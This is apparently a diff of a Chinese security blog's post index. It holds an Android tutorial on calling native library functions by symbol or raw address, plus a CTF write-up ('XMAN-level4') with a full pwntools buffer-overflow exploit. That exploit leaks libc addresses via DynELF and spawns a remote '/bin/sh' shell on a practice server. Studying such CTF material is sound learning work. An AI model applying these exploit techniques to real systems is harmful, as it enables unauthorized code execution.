@@ -9,87 +9,13 @@
 <p>接下来在so中导出函数中该native函数</p>
 <p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native2.jpg" alt=""></p>
 <h2 id="编写Android-APP"><a href="#编写Android-APP" class="headerlink" title="编写Android APP"></a>编写Android APP</h2><p>自己写一个带按钮的APP，调用该函数</p>
-<pre><code>public class MainActivity extends Activity 
-{
-    public Button button;
-    @Override
-    protected void onCreate(Bundle savedInstanceState) 
-    {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-
-        System.loadLibrary(&quot;Aes&quot;);
-
-        try 
-        {
-            button = (Button)findViewById(R.id.btn_test);
-            button.setOnClickListener(new OnClickListener() 
-            {
-
-                public void onClick(View v)
-                {
-                    try 
-                    {
-                        String encrypt = Aes.aesEncode(&quot;12345&quot;,
-                                &quot;350710466385995&quot;);
-
-                        if (null != encrypt) 
-                        {
-
-                            Log.d(&quot;bbk&quot;,&quot;encrypt:&quot; + encrypt);
-                        }
-                        else 
-                        {
-                            Log.d(&quot;bbk&quot;, &quot;encrypt is NULL&quot;);
-                        }    
-
-                    } 
-                    catch (Exception e) 
-                    {
-                        for (int i = 0; i &lt; e.getStackTrace().length; i++)
-                        {
-                            Log.i(&quot;bbk&quot;,e.getStackTrace()[i].toString());
-                        }
-                    } 
-
-                }
-            });
-
-        } 
-        catch (Exception e) 
-        {
-            for (int i = 0; i &lt; e.getStackTrace().length; i++)
-            {
-                Log.i(&quot;bbk&quot;,e.getStackTrace()[i].toString());
-            }
-        }  
-
-    }
-}
-</code></pre><p>模拟原APP调用类调用native函数</p>
-<pre><code>public class Aes 
-{
-    private static native String aesEncode(String str, String str2);
-}
-</code></pre><h2 id="jni配置"><a href="#jni配置" class="headerlink" title="jni配置"></a>jni配置</h2><p>将libAes.so及其依赖库libstlport.shared.so放入jni目录，并编写mk文件配置。</p>
-<h3 id="Android-mk"><a href="#Android-mk" class="headerlink" title="Android.mk"></a>Android.mk</h3><pre><code>LOCAL_PATH := $(call my-dir)
-
-include $(CLEAR_VARS)
-LOCAL_MODULE := Aes
-LOCAL_SRC_FILES := libAes.so
-include $(PREBUILT_SHARED_LIBRARY)
-
-include $(CLEAR_VARS)
-LOCAL_MODULE := stlport_shared
-LOCAL_SRC_FILES := libstlport_shared.so
-include $(PREBUILT_SHARED_LIBRARY)
-
-include $(CLEAR_VARS)
-LOCAL_MODULE    := my_objectname
-LOCAL_SRC_FILES := my_objectname.cpp
-include $(BUILD_SHARED_LIBRARY)
-</code></pre><h3 id="Application-mk"><a href="#Application-mk" class="headerlink" title="Application.mk"></a>Application.mk</h3><pre><code>APP_ABI := armeabi-v7a
-</code></pre><h3 id="my-objectname-app"><a href="#my-objectname-app" class="headerlink" title="my_objectname.app"></a>my_objectname.app</h3><p>里面写#include<jni.h>即可</jni.h></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span></div><div class="line">	&#123;</div><div class="line">		<span class="keyword">public</span> Button button;</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span></div><div class="line">		&#123;</div><div class="line">			<span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">			setContentView(R.layout.activity_main);</div><div class="line">	</div><div class="line">			System.loadLibrary(<span class="string">"Aes"</span>);</div><div class="line">	</div><div class="line">			<span class="keyword">try</span> </div><div class="line">			&#123;</div><div class="line">				button = (Button)findViewById(R.id.btn_test);</div><div class="line">				button.setOnClickListener(<span class="keyword">new</span> OnClickListener() </div><div class="line">				&#123;</div><div class="line">			</div><div class="line">					<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span></div><div class="line">					&#123;</div><div class="line">						<span class="keyword">try</span> </div><div class="line">						&#123;</div><div class="line">							String encrypt = Aes.aesEncode(<span class="string">"12345"</span>,</div><div class="line">									<span class="string">"350710466385995"</span>);</div><div class="line">							</div><div class="line">							<span class="keyword">if</span> (<span class="keyword">null</span> != encrypt) </div><div class="line">							&#123;</div><div class="line">		</div><div class="line">								Log.d(<span class="string">"bbk"</span>,<span class="string">"encrypt:"</span> + encrypt);</div><div class="line">							&#125;</div><div class="line">							<span class="keyword">else</span> </div><div class="line">							&#123;</div><div class="line">								Log.d(<span class="string">"bbk"</span>, <span class="string">"encrypt is NULL"</span>);</div><div class="line">							&#125;	</div><div class="line">						</div><div class="line">						&#125; </div><div class="line">						<span class="keyword">catch</span> (Exception e) </div><div class="line">						&#123;</div><div class="line">							<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; e.getStackTrace().length; i++)</div><div class="line">							&#123;</div><div class="line">								Log.i(<span class="string">"bbk"</span>,e.getStackTrace()[i].toString());</div><div class="line">							&#125;</div><div class="line">						&#125; </div><div class="line">						</div><div class="line">					&#125;</div><div class="line">				&#125;);</div><div class="line">		</div><div class="line">			&#125; </div><div class="line">			<span class="keyword">catch</span> (Exception e) </div><div class="line">			&#123;</div><div class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; e.getStackTrace().length; i++)</div><div class="line">				&#123;</div><div class="line">					Log.i(<span class="string">"bbk"</span>,e.getStackTrace()[i].toString());</div><div class="line">				&#125;</div><div class="line">			&#125;  </div><div class="line">			</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
+<p>模拟原APP调用类调用native函数</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Aes</span> </span></div><div class="line">&#123;</div><div class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">aesEncode</span><span class="params">(String str, String str2)</span></span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="jni配置"><a href="#jni配置" class="headerlink" title="jni配置"></a>jni配置</h2><p>将libAes.so及其依赖库libstlport.shared.so放入jni目录，并编写mk文件配置。</p>
+<h3 id="Android-mk"><a href="#Android-mk" class="headerlink" title="Android.mk"></a>Android.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">LOCAL_PATH := $(call my-dir)</div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE := Aes</div><div class="line">LOCAL_SRC_FILES := libAes.so</div><div class="line">include $(PREBUILT_SHARED_LIBRARY)</div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE := stlport_shared</div><div class="line">LOCAL_SRC_FILES := libstlport_shared.so</div><div class="line">include $(PREBUILT_SHARED_LIBRARY)</div><div class="line"></div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE    := my_objectname</div><div class="line">LOCAL_SRC_FILES := my_objectname.cpp</div><div class="line">include $(BUILD_SHARED_LIBRARY)</div></pre></td></tr></table></figure>
+<h3 id="Application-mk"><a href="#Application-mk" class="headerlink" title="Application.mk"></a>Application.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">APP_ABI := armeabi-v7a</div></pre></td></tr></table></figure>
+<h3 id="my-objectname-app"><a href="#my-objectname-app" class="headerlink" title="my_objectname.app"></a>my_objectname.app</h3><p>里面写#include<jni.h>即可</jni.h></p>
 <p>最后将APP安装到手机上运行即可输出调用结果</p>
 <p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native3.jpg" alt=""></p>
 <h1 id="通过函数地址调用native函数"><a href="#通过函数地址调用native函数" class="headerlink" title="通过函数地址调用native函数"></a>通过函数地址调用native函数</h1><p>在逆向过程中还会遇到很多APP动态注册native函数，甚至是将导出函数隐藏的，就无法使用上述的调用方案了，本方案是通过函数地址来调用native函数，理论上只要找得到native函数在so中的地址就可以实现调用。</p>
@@ -98,118 +24,11 @@ include $(BUILD_SHARED_LIBRARY)
 <p>kxtmp函数是动态注册函数，现在字符串中搜索函数名，之后通过回溯找到函数注册地址</p>
 <p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native5.jpg" alt=""></p>
 <h2 id="编写调用so"><a href="#编写调用so" class="headerlink" title="编写调用so"></a>编写调用so</h2><p>本方案主要是通过自己编写的so调用native函数所在的so，自己的so名为hookso<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</div><div class="line">	</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">			<span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">			setContentView(R.layout.activity_main);</div><div class="line">			</div><div class="line">			System.loadLibrary(<span class="string">"hookso"</span>);</div><div class="line">			</div><div class="line">			<span class="keyword">float</span> value =TypedValue.complexToFloat(<span class="number">55297</span>);</div><div class="line">			Log.e(<span class="string">"DEBUG"</span>, <span class="string">": "</span> + value);</div><div class="line">		&#125;</div><div class="line">	</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</div><div class="line">			<span class="comment">// Inflate the menu; this adds items to the action bar if it is present.</span></div><div class="line">			getMenuInflater().inflate(R.menu.main, menu);</div><div class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">		&#125;</div><div class="line">	</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> </span>&#123;</div><div class="line">			<span class="comment">// Handle action bar item clicks here. The action bar will</span></div><div class="line">			<span class="comment">// automatically handle clicks on the Home/Up button, so long</span></div><div class="line">			<span class="comment">// as you specify a parent activity in AndroidManifest.xml.</span></div><div class="line">			<span class="keyword">int</span> id = item.getItemId();</div><div class="line">			<span class="keyword">if</span> (id == R.id.action_settings) &#123;</div><div class="line">				JNI.testfunc();</div><div class="line">				<span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">return</span> <span class="keyword">super</span>.onOptionsItemSelected(item);</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
-<pre><code>public class JNI
-{
-    public static native void testfunc();
-}
-</code></pre><h2 id="jni配置-1"><a href="#jni配置-1" class="headerlink" title="jni配置"></a>jni配置</h2><h3 id="Android-mk-1"><a href="#Android-mk-1" class="headerlink" title="Android.mk"></a>Android.mk</h3><pre><code>LOCAL_PATH := $(call my-dir)
-include $(CLEAR_VARS)
-LOCAL_MODULE    := hookso
-LOCAL_SRC_FILES := hookso.cpp
-
-LOCAL_LDLIBS += -llog  #log
-
-include $(BUILD_SHARED_LIBRARY)
-</code></pre><h3 id="Application-mk-1"><a href="#Application-mk-1" class="headerlink" title="Application.mk"></a>Application.mk</h3><pre><code>APP_ABI := armeabi-v7a
-APP_STL := c++_shared
-APP_CPPFLAGS := -fexceptions -frtti 
-</code></pre><h3 id="hookso-cpp"><a href="#hookso-cpp" class="headerlink" title="hookso.cpp"></a>hookso.cpp</h3><pre><code>#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;sys/ptrace.h&gt;
-#include &lt;sys/user.h&gt;
-#include &lt;sys/wait.h&gt;
-#include &lt;sys/mman.h&gt;
-#include &lt;sys/stat.h&gt;
-#include &lt;sys/syscall.h&gt;
-#include &lt;fcntl.h&gt;
-#include &lt;dlfcn.h&gt;
-#include &lt;dirent.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;string.h&gt;
-#include &lt;android/log.h&gt;
-#include &lt;elf.h&gt;
-#include &lt;errno.h&gt;
-#include &lt;jni.h&gt;
-#include &lt;sys/socket.h&gt;
-#include &lt;linux/un.h&gt;
-#include &lt;netinet/in.h&gt;
-#include &lt;pthread.h&gt;
-#include &lt;arpa/inet.h&gt;
-#include &lt;iostream&gt;
-
-#ifdef __cplusplus
-extern &quot;C&quot; {
-#endif
-
-typedef u_int32_t (*common_func_t)(u_int32_t, u_int32_t, u_int32_t, u_int32_t);
-
-#define LOG_TAG &quot;DEBUG&quot;
-
-#define LOGD(lvl, fmt, args...) __android_log_print(lvl, \
-        LOG_TAG, fmt, ##args)
-
-void* get_module_base(pid_t pid, const char* module_name)
-{
-    FILE* fp;
-    long addr = 0;
-    char *pch;
-    char filename[32];
-    char line[1024];
-
-    if(pid &lt;= 0){
-        snprintf(filename, sizeof(filename), &quot;/proc/self/maps&quot;);
-    }else{
-        snprintf(filename, sizeof(filename), &quot;/proc/%d/maps&quot;, pid);
-    }
-    fp = fopen(filename,&quot;r&quot;);
-    if(fp != NULL)
-    {
-        while(fgets(line, sizeof(line), fp))
-        {
-            if(strstr(line, module_name))
-            {
-                pch = strtok(line, &quot;-&quot;);
-                addr = strtoul(pch, NULL, 16);
-                break;
-            }
-        }
-        fclose(fp);
-    }
-    return (void*)addr;
-}
-
-void Java_com_example_hookso_JNI_testfunc(JNIEnv *env, jobject jobj);
-
-#ifdef __cplusplus
-}
-
-using namespace std;
-
-void Java_com_example_hookso_JNI_testfunc(JNIEnv *env, jobject jobj)
-{
-    string str = &quot;1&quot;;
-    LOGD(ANDROID_LOG_WARN, &quot;Java_com_example_hookso_JNI_testfunc: %s\n&quot;, str.c_str());
-    void *cs_handle = dlopen(&quot;/data/local/tmp/native.so&quot;, RTLD_NOW);
-    LOGD(ANDROID_LOG_WARN, &quot;[+] dlerror : %s&quot;, dlerror());
-    LOGD(ANDROID_LOG_WARN, &quot;[+] cs_handle: %p&quot;, cs_handle);
-//导出用下面这一句
-//    void *cs_open_func = dlsym(cs_handle, &quot;导出函数name&quot;);
-
-    u_int32_t addr1 = (u_int32_t)get_module_base(0, &quot;ntiave.so&quot;);
-    //arm指令不加1 0，thumb指令加1 1
-    addr1 += 0x0000ABD4;
-    common_func_t func = (common_func_t)addr1;
-
-    jstring key = env-&gt;NewStringUTF(&quot;1&quot;);
-//    jstring str = env-&gt;NewStringUTF(&quot;qazwsxedcrfvtgbh64as65d465wq6d54a6s54d98aw4d65a4sd64qw6f46a4s9fd8d&quot;);
-
-    jstring ret1 = (jstring)func((u_int32_t)env, 0, (u_int32_t)key, 0);
-//    jstring ret1 = (jstring)func((u_int32_t)env, 0, 0, 0);
-
-    LOGD(ANDROID_LOG_DEBUG, &quot;[+] test_jstr: %s, size: %d&quot;, env-&gt;GetStringUTFChars((jstring)ret1, false), env-&gt;GetStringUTFLength((jstring)ret1));
-}
-#endif
-</code></pre>]]></content>
+<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNI</span></span></div><div class="line">&#123;</div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">testfunc</span><span class="params">()</span></span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="jni配置-1"><a href="#jni配置-1" class="headerlink" title="jni配置"></a>jni配置</h2><h3 id="Android-mk-1"><a href="#Android-mk-1" class="headerlink" title="Android.mk"></a>Android.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"></div><div class="line">LOCAL_PATH := $(call my-dir)</div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE    := hookso</div><div class="line">LOCAL_SRC_FILES := hookso.cpp</div><div class="line"></div><div class="line">LOCAL_LDLIBS += -llog  #<span class="built_in">log</span></div><div class="line"></div><div class="line">include $(BUILD_SHARED_LIBRARY)</div></pre></td></tr></table></figure>
+<h3 id="Application-mk-1"><a href="#Application-mk-1" class="headerlink" title="Application.mk"></a>Application.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">APP_ABI := armeabi-v7a</div><div class="line">APP_STL := c++<span class="number">_</span>shared</div><div class="line">APP_CPPFLAGS := -fexceptions -frtti</div></pre></td></tr></table></figure>
+<h3 id="hookso-cpp"><a href="#hookso-cpp" class="headerlink" title="hookso.cpp"></a>hookso.cpp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;android/log.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;elf.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/un.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></div><div class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">u_int32_t</span> <span class="params">(*<span class="keyword">common_func_t</span>)</span><span class="params">(<span class="keyword">u_int32_t</span>, <span class="keyword">u_int32_t</span>, <span class="keyword">u_int32_t</span>, <span class="keyword">u_int32_t</span>)</span></span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_TAG <span class="meta-string">"DEBUG"</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGD(lvl, fmt, args...) __android_log_print(lvl, \</span></div><div class="line">		LOG_TAG, fmt, ##args)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span>* <span class="title">get_module_base</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">const</span> <span class="keyword">char</span>* module_name)</span></span></div><div class="line">&#123;</div><div class="line">    FILE* fp;</div><div class="line">    <span class="keyword">long</span> addr = <span class="number">0</span>;</div><div class="line">    <span class="keyword">char</span> *pch;</div><div class="line">    <span class="keyword">char</span> filename[<span class="number">32</span>];</div><div class="line">    <span class="keyword">char</span> line[<span class="number">1024</span>];</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(pid &lt;= <span class="number">0</span>)&#123;</div><div class="line">        <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"/proc/self/maps"</span>);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"/proc/%d/maps"</span>, pid);</div><div class="line">    &#125;</div><div class="line">    fp = fopen(filename,<span class="string">"r"</span>);</div><div class="line">    <span class="keyword">if</span>(fp != <span class="literal">NULL</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">while</span>(fgets(line, <span class="keyword">sizeof</span>(line), fp))</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span>(<span class="built_in">strstr</span>(line, module_name))</div><div class="line">            &#123;</div><div class="line">                pch = strtok(line, <span class="string">"-"</span>);</div><div class="line">                addr = strtoul(pch, <span class="literal">NULL</span>, <span class="number">16</span>);</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        fclose(fp);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> (<span class="keyword">void</span>*)addr;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Java_com_example_hookso_JNI_testfunc</span><span class="params">(JNIEnv *env, jobject jobj)</span></span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Java_com_example_hookso_JNI_testfunc</span><span class="params">(JNIEnv *env, jobject jobj)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="built_in">string</span> str = <span class="string">"1"</span>;</div><div class="line">	LOGD(ANDROID_LOG_WARN, <span class="string">"Java_com_example_hookso_JNI_testfunc: %s\n"</span>, str.c_str());</div><div class="line">	<span class="keyword">void</span> *cs_handle = dlopen(<span class="string">"/data/local/tmp/native.so"</span>, RTLD_NOW);</div><div class="line">	LOGD(ANDROID_LOG_WARN, <span class="string">"[+] dlerror : %s"</span>, dlerror());</div><div class="line">	LOGD(ANDROID_LOG_WARN, <span class="string">"[+] cs_handle: %p"</span>, cs_handle);</div><div class="line"><span class="comment">//导出用下面这一句</span></div><div class="line"><span class="comment">//	void *cs_open_func = dlsym(cs_handle, "导出函数name");</span></div><div class="line"></div><div class="line">	<span class="keyword">u_int32_t</span> addr1 = (<span class="keyword">u_int32_t</span>)get_module_base(<span class="number">0</span>, <span class="string">"ntiave.so"</span>);</div><div class="line">	<span class="comment">//arm指令不加1 0，thumb指令加1 1</span></div><div class="line">	addr1 += <span class="number">0x0000ABD4</span>;</div><div class="line">	<span class="keyword">common_func_t</span> func = (<span class="keyword">common_func_t</span>)addr1;</div><div class="line"></div><div class="line">	jstring key = env-&gt;NewStringUTF(<span class="string">"1"</span>);</div><div class="line"><span class="comment">//	jstring str = env-&gt;NewStringUTF("qazwsxedcrfvtgbh64as65d465wq6d54a6s54d98aw4d65a4sd64qw6f46a4s9fd8d");</span></div><div class="line"></div><div class="line">	jstring ret1 = (jstring)func((<span class="keyword">u_int32_t</span>)env, <span class="number">0</span>, (<span class="keyword">u_int32_t</span>)key, <span class="number">0</span>);</div><div class="line"><span class="comment">//	jstring ret1 = (jstring)func((u_int32_t)env, 0, 0, 0);</span></div><div class="line"></div><div class="line">	LOGD(ANDROID_LOG_DEBUG, <span class="string">"[+] test_jstr: %s, size: %d"</span>, env-&gt;GetStringUTFChars((jstring)ret1, <span class="literal">false</span>), env-&gt;GetStringUTFLength((jstring)ret1));</div><div class="line">&#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div></pre></td></tr></table></figure>
+]]></content>
       <tags>
         <tag>Android</tag>
         <tag>Tools</tag>
@@ -418,6 +237,53 @@ sh.interactive()
       </tags>
   </entry>
   <entry>
+    <title>XMAN-level4</title>
+    <url>/2017/02/28/XMAN-level4/</url>
+    <content><![CDATA[<p>本题其实就是level3的一个升级版本，唯一的区别就是本题没有提供libc，可以通过DynELF泄漏函数真实地址。<br><a id="more"></a><br>有一个地方需要注意，leak函数可以在write之后直接pop三个参数再返回main：</p>
+<pre><code>payload+=p32(write_plt)+p32(pppr)+p32(1)+p32(address)+p32(4)+p32(main)
+</code></pre><p>也可以重新返回vuln：</p>
+<pre><code>payload+=p32(write_plt)+p32(vlun)+p32(1)+p32(address)+p32(4)
+</code></pre><p>脚本如下：</p>
+<pre><code>from pwn import *
+
+#p=process(&apos;./level4&apos;)
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9880)
+level4=ELF(&apos;./level4&apos;)
+
+#plt
+write_plt=0x08048340
+read_plt=0x08048310
+
+#addr
+main=level4.symbols[&apos;main&apos;]
+basebss=level4.bss()
+pppr=0x08048509
+
+def leak(address):
+        payload=&apos;A&apos;*140
+    payload+=p32(write_plt)+p32(pppr)+p32(1)+p32(address)+p32(4)+p32(main)
+        p.send(payload)
+        data =p.recv(4)
+    print &quot;%#x %s&quot; % (address, data)
+        return data
+
+
+d = DynELF(leak, elf=ELF(&apos;./level4&apos;))
+
+system_addr = d.lookup(&apos;system&apos;,&apos;libc&apos;)
+log.success(&apos;leak system address: &apos; + hex(system_addr))
+
+payload2=&apos;A&apos;*140+p32(read_plt)+p32(pppr)+p32(0)+p32(basebss)+p32(8)+p32(system_addr)+p32(main)+p32(basebss)
+p.send(payload2)
+p.send(&apos;/bin/sh\x00&apos;)
+p.interactive()
+</code></pre>]]></content>
+      <tags>
+        <tag>ctf</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>checksec及其包含的保护机制</title>
     <url>/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
     <content><![CDATA[<p>今天在研究liunx下栈溢出的时候发现自己对各种保护机制并不是特别了解，因此就这方面的知识在网上查找了一些资料并总结了一些心得和大家分享。<br><a id="more"></a><br>操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险，包括DEP、ASLR等。在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了DEP（Linux下对应NX）、ASLR（Linux下对应PIE）等机制，例如存在DEP（NX）的话就不能直接执行栈上的数据，存在ASLR的话各个系统调用的地址就是随机化的。</p>
@@ -501,53 +367,6 @@ gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数�
 ]]></content>
       <tags>
         <tag>liunx</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XMAN-level4</title>
-    <url>/2017/02/28/XMAN-level4/</url>
-    <content><![CDATA[<p>本题其实就是level3的一个升级版本，唯一的区别就是本题没有提供libc，可以通过DynELF泄漏函数真实地址。<br><a id="more"></a><br>有一个地方需要注意，leak函数可以在write之后直接pop三个参数再返回main：</p>
-<pre><code>payload+=p32(write_plt)+p32(pppr)+p32(1)+p32(address)+p32(4)+p32(main)
-</code></pre><p>也可以重新返回vuln：</p>
-<pre><code>payload+=p32(write_plt)+p32(vlun)+p32(1)+p32(address)+p32(4)
-</code></pre><p>脚本如下：</p>
-<pre><code>from pwn import *
-
-#p=process(&apos;./level4&apos;)
-p=remote(&apos;pwn2.jarvisoj.com&apos;,9880)
-level4=ELF(&apos;./level4&apos;)
-
-#plt
-write_plt=0x08048340
-read_plt=0x08048310
-
-#addr
-main=level4.symbols[&apos;main&apos;]
-basebss=level4.bss()
-pppr=0x08048509
-
-def leak(address):
-        payload=&apos;A&apos;*140
-    payload+=p32(write_plt)+p32(pppr)+p32(1)+p32(address)+p32(4)+p32(main)
-        p.send(payload)
-        data =p.recv(4)
-    print &quot;%#x %s&quot; % (address, data)
-        return data
-
-
-d = DynELF(leak, elf=ELF(&apos;./level4&apos;))
-
-system_addr = d.lookup(&apos;system&apos;,&apos;libc&apos;)
-log.success(&apos;leak system address: &apos; + hex(system_addr))
-
-payload2=&apos;A&apos;*140+p32(read_plt)+p32(pppr)+p32(0)+p32(basebss)+p32(8)+p32(system_addr)+p32(main)+p32(basebss)
-p.send(payload2)
-p.send(&apos;/bin/sh\x00&apos;)
-p.interactive()
-</code></pre>]]></content>
-      <tags>
-        <tag>ctf</tag>
-        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -2596,44 +2415,6 @@ print(flag)
       </tags>
   </entry>
   <entry>
-    <title>reverse之第四更</title>
-    <url>/2017/01/20/reverse%E4%B9%8B%E7%AC%AC%E5%9B%9B%E6%9B%B4/</url>
-    <content><![CDATA[<p>首先读取文件的头四个字节判断是否是0x33465443，不是提示“你打开的不是.ctf加密文件”。<br><a id="more"></a></p>
-<p><img src="http://p1.bqimg.com/567571/a39714c92cd59c03.png" alt=""></p>
